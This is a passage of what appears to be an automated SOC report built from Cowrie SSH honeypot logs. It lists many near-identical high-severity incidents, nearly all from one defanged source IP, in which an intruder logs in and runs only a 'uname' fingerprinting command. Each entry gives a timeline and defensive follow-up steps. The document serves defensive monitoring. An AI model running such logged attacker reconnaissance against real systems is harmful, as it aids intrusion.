| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:45:05` | `cowrie.session.connect` |
| `2026-08-16 18:45:05` | `cowrie.client.version` |
| `2026-08-16 18:45:05` | `cowrie.client.kex` |
| `2026-08-16 18:45:06` | `cowrie.login.success` |
| `2026-08-16 18:45:06` | `cowrie.session.params` |
| `2026-08-16 18:45:06` | `cowrie.command.input` |
| `2026-08-16 18:45:06` | `cowrie.log.closed` |
| `2026-08-16 18:45:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93623c3461ff

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:45 |
| **Last Seen** | 2026-08-16 18:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:45:11` | `cowrie.session.connect` |
| `2026-08-16 18:45:11` | `cowrie.client.version` |
| `2026-08-16 18:45:11` | `cowrie.client.kex` |
| `2026-08-16 18:45:11` | `cowrie.login.success` |
| `2026-08-16 18:45:12` | `cowrie.session.params` |
| `2026-08-16 18:45:12` | `cowrie.command.input` |
| `2026-08-16 18:45:12` | `cowrie.log.closed` |
| `2026-08-16 18:45:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a47d443695f

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:45 |
| **Last Seen** | 2026-08-16 18:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:45:16` | `cowrie.session.connect` |
| `2026-08-16 18:45:16` | `cowrie.client.version` |
| `2026-08-16 18:45:16` | `cowrie.client.kex` |
| `2026-08-16 18:45:17` | `cowrie.login.success` |
| `2026-08-16 18:45:18` | `cowrie.session.params` |
| `2026-08-16 18:45:18` | `cowrie.command.input` |
| `2026-08-16 18:45:18` | `cowrie.log.closed` |
| `2026-08-16 18:45:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14a5aa455492

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:45 |
| **Last Seen** | 2026-08-16 18:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:45:22` | `cowrie.session.connect` |
| `2026-08-16 18:45:22` | `cowrie.client.version` |
| `2026-08-16 18:45:22` | `cowrie.client.kex` |
| `2026-08-16 18:45:22` | `cowrie.login.success` |
| `2026-08-16 18:45:23` | `cowrie.session.params` |
| `2026-08-16 18:45:23` | `cowrie.command.input` |
| `2026-08-16 18:45:23` | `cowrie.log.closed` |
| `2026-08-16 18:45:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cf0795a941c

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:45 |
| **Last Seen** | 2026-08-16 18:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:45:27` | `cowrie.session.connect` |
| `2026-08-16 18:45:27` | `cowrie.client.version` |
| `2026-08-16 18:45:27` | `cowrie.client.kex` |
| `2026-08-16 18:45:27` | `cowrie.login.success` |
| `2026-08-16 18:45:28` | `cowrie.session.params` |
| `2026-08-16 18:45:28` | `cowrie.command.input` |
| `2026-08-16 18:45:28` | `cowrie.log.closed` |
| `2026-08-16 18:45:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e39875e5f824

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:45 |
| **Last Seen** | 2026-08-16 18:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:45:32` | `cowrie.session.connect` |
| `2026-08-16 18:45:32` | `cowrie.client.version` |
| `2026-08-16 18:45:32` | `cowrie.client.kex` |
| `2026-08-16 18:45:32` | `cowrie.login.success` |
| `2026-08-16 18:45:33` | `cowrie.session.params` |
| `2026-08-16 18:45:33` | `cowrie.command.input` |
| `2026-08-16 18:45:33` | `cowrie.log.closed` |
| `2026-08-16 18:45:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb395d0eec45

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:45 |
| **Last Seen** | 2026-08-16 18:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:45:37` | `cowrie.session.connect` |
| `2026-08-16 18:45:37` | `cowrie.client.version` |
| `2026-08-16 18:45:37` | `cowrie.client.kex` |
| `2026-08-16 18:45:38` | `cowrie.login.success` |
| `2026-08-16 18:45:39` | `cowrie.session.params` |
| `2026-08-16 18:45:39` | `cowrie.command.input` |
| `2026-08-16 18:45:39` | `cowrie.log.closed` |
| `2026-08-16 18:45:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ede4c2bd7bb

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:45 |
| **Last Seen** | 2026-08-16 18:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:45:43` | `cowrie.session.connect` |
| `2026-08-16 18:45:43` | `cowrie.client.version` |
| `2026-08-16 18:45:43` | `cowrie.client.kex` |
| `2026-08-16 18:45:44` | `cowrie.login.success` |
| `2026-08-16 18:45:44` | `cowrie.session.params` |
| `2026-08-16 18:45:44` | `cowrie.command.input` |
| `2026-08-16 18:45:44` | `cowrie.log.closed` |
| `2026-08-16 18:45:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0e223c7b417

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:45 |
| **Last Seen** | 2026-08-16 18:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:45:49` | `cowrie.session.connect` |
| `2026-08-16 18:45:49` | `cowrie.client.version` |
| `2026-08-16 18:45:49` | `cowrie.client.kex` |
| `2026-08-16 18:45:49` | `cowrie.login.success` |
| `2026-08-16 18:45:50` | `cowrie.session.params` |
| `2026-08-16 18:45:50` | `cowrie.command.input` |
| `2026-08-16 18:45:50` | `cowrie.log.closed` |
| `2026-08-16 18:45:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12d7345bf3e3

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:45 |
| **Last Seen** | 2026-08-16 18:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:45:54` | `cowrie.session.connect` |
| `2026-08-16 18:45:54` | `cowrie.client.version` |
| `2026-08-16 18:45:54` | `cowrie.client.kex` |
| `2026-08-16 18:45:54` | `cowrie.login.success` |
| `2026-08-16 18:45:55` | `cowrie.session.params` |
| `2026-08-16 18:45:55` | `cowrie.command.input` |
| `2026-08-16 18:45:56` | `cowrie.log.closed` |
| `2026-08-16 18:45:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7bff814a9c1

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:46 |
| **Last Seen** | 2026-08-16 18:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:46:00` | `cowrie.session.connect` |
| `2026-08-16 18:46:00` | `cowrie.client.version` |
| `2026-08-16 18:46:00` | `cowrie.client.kex` |
| `2026-08-16 18:46:00` | `cowrie.login.success` |
| `2026-08-16 18:46:01` | `cowrie.session.params` |
| `2026-08-16 18:46:01` | `cowrie.command.input` |
| `2026-08-16 18:46:01` | `cowrie.log.closed` |
| `2026-08-16 18:46:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da152d01df28

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:46 |
| **Last Seen** | 2026-08-16 18:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:46:05` | `cowrie.session.connect` |
| `2026-08-16 18:46:05` | `cowrie.client.version` |
| `2026-08-16 18:46:05` | `cowrie.client.kex` |
| `2026-08-16 18:46:05` | `cowrie.login.success` |
| `2026-08-16 18:46:06` | `cowrie.session.params` |
| `2026-08-16 18:46:06` | `cowrie.command.input` |
| `2026-08-16 18:46:06` | `cowrie.log.closed` |
| `2026-08-16 18:46:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f6dddbf502c

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:46 |
| **Last Seen** | 2026-08-16 18:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:46:10` | `cowrie.session.connect` |
| `2026-08-16 18:46:10` | `cowrie.client.version` |
| `2026-08-16 18:46:10` | `cowrie.client.kex` |
| `2026-08-16 18:46:11` | `cowrie.login.success` |
| `2026-08-16 18:46:12` | `cowrie.session.params` |
| `2026-08-16 18:46:12` | `cowrie.command.input` |
| `2026-08-16 18:46:12` | `cowrie.log.closed` |
| `2026-08-16 18:46:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-456ea8d428be

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:46 |
| **Last Seen** | 2026-08-16 18:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:46:16` | `cowrie.session.connect` |
| `2026-08-16 18:46:16` | `cowrie.client.version` |
| `2026-08-16 18:46:16` | `cowrie.client.kex` |
| `2026-08-16 18:46:16` | `cowrie.login.success` |
| `2026-08-16 18:46:17` | `cowrie.session.params` |
| `2026-08-16 18:46:17` | `cowrie.command.input` |
| `2026-08-16 18:46:17` | `cowrie.log.closed` |
| `2026-08-16 18:46:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f22a0a2d336c

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:46 |
| **Last Seen** | 2026-08-16 18:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:46:21` | `cowrie.session.connect` |
| `2026-08-16 18:46:21` | `cowrie.client.version` |
| `2026-08-16 18:46:21` | `cowrie.client.kex` |
| `2026-08-16 18:46:22` | `cowrie.login.success` |
| `2026-08-16 18:46:22` | `cowrie.session.params` |
| `2026-08-16 18:46:22` | `cowrie.command.input` |
| `2026-08-16 18:46:23` | `cowrie.log.closed` |
| `2026-08-16 18:46:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61a3f8081878

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:46 |
| **Last Seen** | 2026-08-16 18:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:46:27` | `cowrie.session.connect` |
| `2026-08-16 18:46:27` | `cowrie.client.version` |
| `2026-08-16 18:46:27` | `cowrie.client.kex` |
| `2026-08-16 18:46:27` | `cowrie.login.success` |
| `2026-08-16 18:46:28` | `cowrie.session.params` |
| `2026-08-16 18:46:28` | `cowrie.command.input` |
| `2026-08-16 18:46:28` | `cowrie.log.closed` |
| `2026-08-16 18:46:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79f4092949ea

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:46 |
| **Last Seen** | 2026-08-16 18:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:46:28` | `cowrie.session.connect` |
| `2026-08-16 18:46:28` | `cowrie.client.version` |
| `2026-08-16 18:46:28` | `cowrie.client.kex` |
| `2026-08-16 18:46:29` | `cowrie.login.success` |
| `2026-08-16 18:46:29` | `cowrie.session.params` |
| `2026-08-16 18:46:29` | `cowrie.command.input` |
| `2026-08-16 18:46:29` | `cowrie.log.closed` |
| `2026-08-16 18:46:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c3ed9396941

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:46 |
| **Last Seen** | 2026-08-16 18:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:46:32` | `cowrie.session.connect` |
| `2026-08-16 18:46:32` | `cowrie.client.version` |
| `2026-08-16 18:46:32` | `cowrie.client.kex` |
| `2026-08-16 18:46:33` | `cowrie.login.success` |
| `2026-08-16 18:46:34` | `cowrie.session.params` |
| `2026-08-16 18:46:34` | `cowrie.command.input` |
| `2026-08-16 18:46:34` | `cowrie.log.closed` |
| `2026-08-16 18:46:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b2200e96104

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:46 |
| **Last Seen** | 2026-08-16 18:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:46:38` | `cowrie.session.connect` |
| `2026-08-16 18:46:38` | `cowrie.client.version` |
| `2026-08-16 18:46:38` | `cowrie.client.kex` |
| `2026-08-16 18:46:38` | `cowrie.login.success` |
| `2026-08-16 18:46:39` | `cowrie.session.params` |
| `2026-08-16 18:46:39` | `cowrie.command.input` |
| `2026-08-16 18:46:39` | `cowrie.log.closed` |
| `2026-08-16 18:46:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a756157b9794

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:46 |
| **Last Seen** | 2026-08-16 18:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:46:43` | `cowrie.session.connect` |
| `2026-08-16 18:46:43` | `cowrie.client.version` |
| `2026-08-16 18:46:43` | `cowrie.client.kex` |
| `2026-08-16 18:46:43` | `cowrie.login.success` |
| `2026-08-16 18:46:44` | `cowrie.session.params` |
| `2026-08-16 18:46:44` | `cowrie.command.input` |
| `2026-08-16 18:46:44` | `cowrie.log.closed` |
| `2026-08-16 18:46:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-510ac4d0626c

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:46 |
| **Last Seen** | 2026-08-16 18:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:46:49` | `cowrie.session.connect` |
| `2026-08-16 18:46:49` | `cowrie.client.version` |
| `2026-08-16 18:46:49` | `cowrie.client.kex` |
| `2026-08-16 18:46:49` | `cowrie.login.success` |
| `2026-08-16 18:46:50` | `cowrie.session.params` |
| `2026-08-16 18:46:50` | `cowrie.command.input` |
| `2026-08-16 18:46:50` | `cowrie.log.closed` |
| `2026-08-16 18:46:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40decc018307

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:46 |
| **Last Seen** | 2026-08-16 18:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:46:54` | `cowrie.session.connect` |
| `2026-08-16 18:46:54` | `cowrie.client.version` |
| `2026-08-16 18:46:54` | `cowrie.client.kex` |
| `2026-08-16 18:46:54` | `cowrie.login.success` |
| `2026-08-16 18:46:55` | `cowrie.session.params` |
| `2026-08-16 18:46:55` | `cowrie.command.input` |
| `2026-08-16 18:46:55` | `cowrie.log.closed` |
| `2026-08-16 18:46:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-901fa6d6bef2

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:46 |
| **Last Seen** | 2026-08-16 18:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:46:59` | `cowrie.session.connect` |
| `2026-08-16 18:46:59` | `cowrie.client.version` |
| `2026-08-16 18:46:59` | `cowrie.client.kex` |
| `2026-08-16 18:47:00` | `cowrie.login.success` |
| `2026-08-16 18:47:01` | `cowrie.session.params` |
| `2026-08-16 18:47:01` | `cowrie.command.input` |
| `2026-08-16 18:47:01` | `cowrie.log.closed` |
| `2026-08-16 18:47:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b379d4d888bd

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:47 |
| **Last Seen** | 2026-08-16 18:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:47:05` | `cowrie.session.connect` |
| `2026-08-16 18:47:05` | `cowrie.client.version` |
| `2026-08-16 18:47:05` | `cowrie.client.kex` |
| `2026-08-16 18:47:05` | `cowrie.login.success` |
| `2026-08-16 18:47:06` | `cowrie.session.params` |
| `2026-08-16 18:47:06` | `cowrie.command.input` |
| `2026-08-16 18:47:06` | `cowrie.log.closed` |
| `2026-08-16 18:47:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d981e75be48b

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:47 |
| **Last Seen** | 2026-08-16 18:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:47:10` | `cowrie.session.connect` |
| `2026-08-16 18:47:10` | `cowrie.client.version` |
| `2026-08-16 18:47:10` | `cowrie.client.kex` |
| `2026-08-16 18:47:11` | `cowrie.login.success` |
| `2026-08-16 18:47:11` | `cowrie.session.params` |
| `2026-08-16 18:47:11` | `cowrie.command.input` |
| `2026-08-16 18:47:11` | `cowrie.log.closed` |
| `2026-08-16 18:47:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-454aa9c99ed7

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:47 |
| **Last Seen** | 2026-08-16 18:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:47:16` | `cowrie.session.connect` |
| `2026-08-16 18:47:16` | `cowrie.client.version` |
| `2026-08-16 18:47:16` | `cowrie.client.kex` |
| `2026-08-16 18:47:17` | `cowrie.login.success` |
| `2026-08-16 18:47:17` | `cowrie.session.params` |
| `2026-08-16 18:47:17` | `cowrie.command.input` |
| `2026-08-16 18:47:18` | `cowrie.log.closed` |
| `2026-08-16 18:47:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
